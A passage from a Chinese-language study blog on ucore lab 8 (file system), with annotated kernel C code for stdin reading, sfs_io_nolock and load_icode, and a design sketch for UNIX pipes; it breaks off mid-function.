class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<br>        <span class="hljs-keyword">for</span> (; ret &lt; len; ret ++, p_rpos ++) &#123;<br>        try_again:<br>            <span class="hljs-keyword">if</span> (p_rpos &lt; p_wpos) &#123; <br>                *buf ++ = stdin_buffer[p_rpos % stdin_BUFSIZE];<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//没有新字符就要进行睡眠并且调度</span><br>                <span class="hljs-keyword">wait_t</span> __wait, *wait = &amp;__wait;<br>                wait_current_set(wait_queue, wait, WT_KBD);<br>                local_intr_restore(intr_flag);<br><br>                schedule();<br><br>                local_intr_save(intr_flag);<br>                wait_current_del(wait_queue, wait);<br>                <span class="hljs-keyword">if</span> (wait-&gt;wakeup_flags == WT_KBD) &#123;<br>                    <span class="hljs-keyword">goto</span> try_again;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上述函数中可以看出，如果<code>p_rpos</code> &lt; <code>p_wpos</code>，则表示有键盘输入的新字符在stdin_buffer中，于是就从stdin_buffer中取出新字符放到iobuf指向的缓冲区中；如果<code>p_rpos</code> &gt;=<code>p_wpos</code>，则表明没有新字符，这样调用read用户态库函数的用户进程就需要采用等待队列的睡眠操作进入睡眠状态，等待键盘输入字符的产生。</p><p>键盘输入字符后，如何唤醒等待键盘输入的用户进程呢？回顾lab1中的外设中断处理，可以了解到，当用户敲击键盘时，会产生键盘中断，在trap_dispatch函数中，当识别出中断是键盘中断（中断号为IRQ_OFFSET + IRQ_KBD）时，会调用dev_stdin_write函数，来把字符写入到stdin_buffer中，且会通过等待队列的唤醒操作唤醒正在等待键盘输入的用户进程。</p><h3 id="文件系统初始化"><a href="#文件系统初始化" class="headerlink" title=".文件系统初始化"></a>.文件系统初始化</h3><blockquote><p>指导书写的真好, 又想复制了(</p></blockquote><p>首先看看kern_init函数，可以发现与lab7相比增加了对fs_init函数的调用。fs_init函数就是文件系统初始化的总控函数，它进一步调用了虚拟文件系统初始化函数vfs_init，与文件相关的设备初始化函数dev_init和Simple FS文件系统的初始化函数sfs_init。这三个初始化函数联合在一起，协同完成了整个虚拟文件系统、SFS文件系统和文件系统对应的设备（键盘、串口、磁盘）的初始化工作。其函数调用关系图如下所示：</p><p><img src="../../image/ucore/image-20220107165956521.png" alt="image-20220107165956521"></p><p>参考上图，并结合源码分析，可大致了解到文件系统的整个初始化流程。</p><ul><li>vfs_init主要建立了一个device list双向链表vdev_list，为后续具体设备（键盘、串口、磁盘）以文件的形式呈现建立查找访问通道。</li><li>dev_init函数通过进一步调用disk0/stdin/stdout_device_init完成对具体设备的初始化，把它们抽象成一个设备文件，并建立对应的inode数据结构，最后把它们链入到vdev_list中。这样通过虚拟文件系统就可以方便地以文件的形式访问这些设备了。</li><li>sfs_init是完成对Simple FS的初始化工作，并把此实例文件系统挂在虚拟文件系统中，从而让ucore的其他部分能够通过访问虚拟文件系统的接口来进一步访问到SFS实例文件系统。</li></ul><h2 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-5"><a href="#练习1-5" class="headerlink" title="练习1"></a>练习1</h3><h4 id="openfile"><a href="#openfile" class="headerlink" title="openfile"></a>openfile</h4><blockquote><p>发现没有讲到的路径格式: </p><ul><li><p>device:/path  </p>  <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/** 或者:</span><br><span class="hljs-comment">* we have either /path or :path</span><br><span class="hljs-comment">* /path is a path relative to the root of the &quot;boot filesystem&quot;</span><br><span class="hljs-comment">* :path is a path relative to the root of the current filesystem</span><br><span class="hljs-comment">* */</span><br></code></pre></div></td></tr></table></figure></li></ul></blockquote><p>首先贴一张函数调用图:</p><p><img src="../../image/ucore/Calls-file_open.png" alt="Calls-file_open"></p><p>基本上都有多路分支, 具体可以看源码, 这里讲个大概.</p><ul><li><p>通过用户libc库中的syscall调用sys_open, 一直到中断处理转到file_open.</p></li><li><p>这个函数就执行一个简单检查以及调用了vfs_open(最重要的函数)</p></li><li><p>如果一切正常, 只会执行vfs_lookup. </p><ul><li><p>第一个get_device是解析路径的, 如果path没有指定设备名称说明只是一个相对路径, 就会执行vfs_getdir</p></li><li><p>然后会调用sfs_lookup(通过宏定义), 通过path找到对应的inode, 下面是他的调用图</p><p><img src="../../image/ucore/image-20220108132923299.png" alt="image-20220108132923299"></p></li></ul></li></ul><h4 id="read-write-file"><a href="#read-write-file" class="headerlink" title="[read,write]file"></a>[read,write]file</h4><p>调用关系如下:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">sys_read(through syscall)-&gt;sys_fileread-&gt;file_read-&gt;vop_read(sfs_read)-&gt;sfs_io-&gt;sys_io_nolock<br></code></pre></div></td></tr></table></figure><ul><li>在<code>sysfile_read</code>里设置了一个4KB的buff, 主要调用了file_read函数将文件中的内容读取到<strong>内核</strong>buff中, 然后再调用copy_to_user()复制到用户空间.  每一次只会读取4096字节数据到buffer中, 然后继续下一次的填充缓冲区.<ul><li>copy_to_user()的原因是copy_to_user能够检查地址合法性和可用性. 比单纯的memcpy安全, 而且内核和用户地址空间的复制基本都是通过这个函数来完成的.</li></ul></li><li>file_read分配file结构体, 设置文件计数以及移动文件指针+缓冲区iobuf, 继续调用sfs_read-&gt;sfs_io(sfs_inode.c)</li><li>sfs_io通过第三个参数来判断是读还是写, 接着调用sfs_io_nolock</li><li>接下来就是练习的内容, read different kind of blocks in file</li></ul><blockquote><p>struct fs 包装了sfs_fs和一些对sfs_fs的操作</p><p>代码分析了一遍, 而且肖佬写的那几个部分都看过了, 实在是不想写那么多, 想看直接看现成的吧…[<a href="https://kiprey.github.io/2020/09/uCore-8/#9-uCore%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0">link</a>]</p></blockquote><p>基本看懂了, 写了一堆注释在源代码里面.(<code>sfs_inode.c:595</code>)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*  </span><br><span class="hljs-comment"> * sfs_io_nolock - Rd/Wr a file content from offset position to offset+length disk blocks&lt;--&gt;buffer (in memroy)</span><br><span class="hljs-comment"> * @sfs:      sfs file system</span><br><span class="hljs-comment"> * @sin:      sfs inode in memory</span><br><span class="hljs-comment"> * @buf:      the buffer Rd/Wr</span><br><span class="hljs-comment"> * @offset:   the offset of file</span><br><span class="hljs-comment"> * @alenp:    the length need to read (is a pointer). and will RETURN the really Rd/Wr lenght</span><br><span class="hljs-comment"> * @write:    BOOL, 0 read, 1 write</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sfs_io_nolock</span><span class="hljs-params">(struct sfs_fs *sfs, struct sfs_inode *<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">off_t</span> offset, <span class="hljs-keyword">size_t</span> *alenp, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> *<span class="hljs-title">din</span> =</span> <span class="hljs-built_in">sin</span>-&gt;din;<br>    assert(din-&gt;type != SFS_TYPE_DIR);<br>    <span class="hljs-keyword">off_t</span> endpos = offset + *alenp, blkoff;<span class="hljs-comment">///endpos感觉恒等于4KB??好像不是</span><br>    *alenp = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// calculate the Rd/Wr end position</span><br>    <span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span> || offset &gt;= SFS_MAX_FILE_SIZE || offset &gt; endpos) &#123;<br>        <span class="hljs-keyword">return</span> -E_INVAL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (offset == endpos) &#123;<span class="hljs-comment">///这是怎么发生的?</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (endpos &gt; SFS_MAX_FILE_SIZE) &#123;<br>        endpos = SFS_MAX_FILE_SIZE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!write) &#123;<span class="hljs-comment">///如果是read</span><br>        <span class="hljs-keyword">if</span> (offset &gt;= din-&gt;size) &#123;<span class="hljs-comment">///读完文件了</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (endpos &gt; din-&gt;size) &#123;<span class="hljs-comment">///不用读那么长, 只要din-&gt;size即可</span><br>            endpos = din-&gt;size;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">///下面这几行又是什么神奇操作, 这通用接口写的也太绝了</span><br>    <span class="hljs-keyword">int</span> (*sfs_buf_op)(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset);<br>    <span class="hljs-keyword">int</span> (*sfs_block_op)(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks);<br>    <span class="hljs-keyword">if</span> (write) &#123;<br>        sfs_buf_op = sfs_wbuf, sfs_block_op = sfs_wblock;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">///如果是read, 要换成 把1个block读到buf 和 把多个block读到buf</span><br>        sfs_buf_op = sfs_rbuf, sfs_block_op = sfs_rblock;<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> size, alen = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">uint32_t</span> ino; <span class="hljs-comment">//the pointer of inode</span><br>    <span class="hljs-keyword">uint32_t</span> blkno = offset / SFS_BLKSIZE;          <span class="hljs-comment">// The NO. of Rd/Wr begin block ///BUFFER不都是4KB的吗??</span><br>    <span class="hljs-keyword">uint32_t</span> nblks = endpos / SFS_BLKSIZE - blkno;  <span class="hljs-comment">// The size of Rd/Wr blocks</span><br><br>  <span class="hljs-comment">//LAB8:EXERCISE1 YOUR CODE HINT: call sfs_bmap_load_nolock, sfs_rbuf, sfs_rblock,etc. read different kind of blocks in file</span><br>    <span class="hljs-keyword">if</span> ((blkoff = offset % SFS_BLKSIZE) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///如果在offset起始block的中间</span><br>        size = (nblks != <span class="hljs-number">0</span>) ? (SFS_BLKSIZE - blkoff) : (endpos - offset);<br>        <span class="hljs-comment">///取出inode编号, 也即block编号, 因为一个block一个inode</span><br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, blkoff)) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///从block和其他信息读取到buf中</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size;<span class="hljs-comment">///要增加alen</span><br>        <span class="hljs-keyword">if</span> (nblks == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///如果只有一个block, 读/写就完成了</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        buf += size, blkno++, nblks--;<span class="hljs-comment">///否则修改一下剩余的参数</span><br>    &#125;<br><br>    size = SFS_BLKSIZE;<span class="hljs-comment">///使用while循环, 逐block读取, 到了剩余的整个block(nblock)等于0的时候退出</span><br>    <span class="hljs-keyword">while</span> (nblks != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_block_op(sfs, buf, ino, <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size, buf += size, blkno++, nblks--;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((size = endpos % SFS_BLKSIZE) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">///读取最后一个block的部分区域, 这三部分基本相同只能说</span><br>        <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="hljs-built_in">sin</span>, blkno, &amp;ino)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        alen += size;<br>    &#125;<br>out:<br>    *alenp = alen;<span class="hljs-comment">///上面要完成alen的赋值, 即真实的读取字节数目</span><br>    <span class="hljs-keyword">if</span> (offset + alen &gt; <span class="hljs-built_in">sin</span>-&gt;din-&gt;size) &#123;<span class="hljs-comment">///好像是用于write的</span><br>        <span class="hljs-built_in">sin</span>-&gt;din-&gt;size = offset + alen;<br>        <span class="hljs-built_in">sin</span>-&gt;dirty = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p class="note note-primary" style="font-style:italic;background-color:rgb(240,230,250)">”UNIX的PIPE机制“的概要设计方案 </p><ul><li>PIPE管道机制是进程间通信的较为重要的一种方式。在VFS中，最简单的做法就是在磁盘上建立一块pipe缓冲文件<code>pipe_tmp</code>。之后，当打开了<code>pipe_tmp</code>文件的某进程fork出子进程后，父子进程就可以通过读写同一文件来实现进程间通信。</li><li>但实际上，上述的进程间通信是十分低效的，因为需要调用多个函数来完成文件读写，同时硬盘的读写速率也远远小于内存。由于用户与实际的文件系统间由虚拟文件系统VFS调控，因此我们可以在内存中根据文件系统规范，建立虚拟pipe缓冲区域文件来代替磁盘上的缓冲文件，这样便可大大提高通信速率。</li></ul><blockquote><p>在linux中PIPE的实现机制(at a high level):</p><ul><li>Linux has a VFS (virtual file system) module called pipefs, that gets mounted in kernel space during boot</li><li>pipefs is mounted alongside the root file system (<code>/</code>), not in it (pipe’s root is <code>pipe:</code>)</li><li>pipefs cannot be directly examined by the user unlike most file systems</li><li>The entry point to pipefs is the <code>pipe(2)</code> syscall</li><li>The <code>pipe(2)</code> syscall is used by shells and other programs to implement piping, and just creates a new file in pipefs, returning two file descriptors (one for the read end, opening using <code>O_RDONLY</code>, and one for the write end, opened using <code>O_WRONLY</code>)</li><li>pipefs is stored using an in-memory file system</li></ul></blockquote><h3 id="练习2-5"><a href="#练习2-5" class="headerlink" title="练习2"></a>练习2</h3><p>fork机制在原先lab7的基础上，多了<code>file_struct</code>结构的复制操作与执行失败时的重置操作。这两部操作分别需要调用<code>copy_files</code>和<code>put_files</code>函数</p><p><code>load_icode</code>中比较重要的是<code>load_icode_read()</code>, 可以根据ELF文件的特点使用偏移来移动当前文件的指针pos, 并且把内容读取到参数buf指向的空间中.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">load_icode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **kargv)</span> </span>&#123;<br>    <span class="hljs-comment">/* LAB8:EXERCISE2 YOUR CODE  HINT:how to load the file with handler fd  in to process&#x27;s memory? how to setup argc/argv?</span><br><span class="hljs-comment">     * MACROs or Functions:</span><br><span class="hljs-comment">     *  mm_create        - create a mm</span><br><span class="hljs-comment">     *  setup_pgdir      - setup pgdir in mm</span><br><span class="hljs-comment">     *  load_icode_read  - read raw data content of program file</span><br><span class="hljs-comment">     *  mm_map           - build new vma</span><br><span class="hljs-comment">     *  pgdir_alloc_page - allocate new memory for  TEXT/DATA/BSS/stack parts</span><br><span class="hljs-comment">     *  lcr3             - update Page Directory Addr Register -- CR3</span><br><span class="hljs-comment">     */</span><br><span class="hljs-comment">/* (1) create a new mm for current process</span><br><span class="hljs-comment">     * (2) create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT</span><br><span class="hljs-comment">     * (3) copy TEXT/DATA/BSS parts in binary to memory space of process</span><br><span class="hljs-comment">     *    (3.1) read raw data content in file and resolve elfhdr</span><br><span class="hljs-comment">     *    (3.2) read raw data content in file and resolve proghdr based on info in elfhdr</span><br><span class="hljs-comment">     *    (3.3) call mm_map to build vma related to TEXT/DATA</span><br><span class="hljs-comment">     *    (3.4) callpgdir_alloc_page to allocate page for TEXT/DATA, read contents in file</span><br><span class="hljs-comment">     *          and copy them into the new allocated pages</span><br><span class="hljs-comment">     *    (3.5) callpgdir_alloc_page to allocate pages for BSS, memset zero in these pages</span><br><span class="hljs-comment">     * (4) call mm_map to setup user stack, and put parameters into user stack</span><br><span class="hljs-comment">     * (5) setup current process&#x27;s mm, cr3, reset pgidr (using lcr3 MARCO)</span><br><span class="hljs-comment">     * (6) setup uargc and uargv in user stacks</span><br><span class="hljs-comment">     * (7) setup trapframe for user environment</span><br><span class="hljs-comment">     * (8) if up steps failed, you should cleanup the env.</span><br><span class="hljs-comment">     */</span><br>    assert(argc &gt;= <span class="hljs-number">0</span> &amp;&amp; argc &lt;= EXEC_MAX_ARG_NUM);<br><br>    <span class="hljs-keyword">if</span> (current-&gt;mm != <span class="hljs-literal">NULL</span>) &#123;<br>        panic(<span class="hljs-string">&quot;load_icode: current-&gt;mm must be empty.\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> ret = -E_NO_MEM;<br>    <span class="hljs-comment">// 创建proc的内存管理结构</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br>    <span class="hljs-keyword">if</span> ((mm = mm_create()) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_mm;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (setup_pgdir(mm) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_pgdir_cleanup_mm;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span>;</span><br>    <span class="hljs-comment">// LAB8 这里要从文件中读取ELF header，而不是Lab7中的内存了</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elfhdr</span> __<span class="hljs-title">elf</span>, *<span class="hljs-title">elf</span> =</span> &amp;__elf;<br>    <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, elf, <span class="hljs-keyword">sizeof</span>(struct elfhdr), <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_elf_cleanup_pgdir;<br>    &#125;<br>    <span class="hljs-comment">// 判断读取入的elf header是否正确</span><br>    <span class="hljs-keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123;<br>        ret = -E_INVAL_ELF;<br>        <span class="hljs-keyword">goto</span> bad_elf_cleanup_pgdir;<br>    &#125;<br>    <span class="hljs-comment">// 根据每一段的大小和基地址来分配不同的内存空间</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proghdr</span> __<span class="hljs-title">ph</span>, *<span class="hljs-title">ph</span> =</span> &amp;__ph;<br>    <span class="hljs-keyword">uint32_t</span> vm_flags, perm, phnum;<br>    <span class="hljs-keyword">for</span> (phnum = <span class="hljs-number">0</span>; phnum &lt; elf-&gt;e_phnum; phnum ++) &#123;<br>        <span class="hljs-comment">// LAB8 从文件特定偏移处读取每个段的详细信息（包括大小、基地址等等）</span><br>        <span class="hljs-keyword">off_t</span> phoff = elf-&gt;e_phoff + <span class="hljs-keyword">sizeof</span>(struct proghdr) * phnum;<br>        <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, ph, <span class="hljs-keyword">sizeof</span>(struct proghdr), phoff)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) &#123;<br>            <span class="hljs-keyword">continue</span> ;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) &#123;<br>            ret = -E_INVAL_ELF;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span> ;<br>        &#125;<br>        vm_flags = <span class="hljs-number">0</span>, perm = PTE_U;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;<br>        <span class="hljs-keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;<br>        <span class="hljs-comment">// 为当前段分配内存空间</span><br>        <span class="hljs-keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">off_t</span> offset = ph-&gt;p_offset;<br>        <span class="hljs-keyword">size_t</span> off, size;<br>        <span class="hljs-keyword">uintptr_t</span> start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE);<br><br>        ret = -E_NO_MEM;<br><br>        end = ph-&gt;p_va + ph-&gt;p_filesz;<br>        <span class="hljs-keyword">while</span> (start &lt; end) &#123;<br>            <span class="hljs-comment">// 设置该内存所对应的页表项</span><br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="hljs-literal">NULL</span>) &#123;<br>                ret = -E_NO_MEM;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>          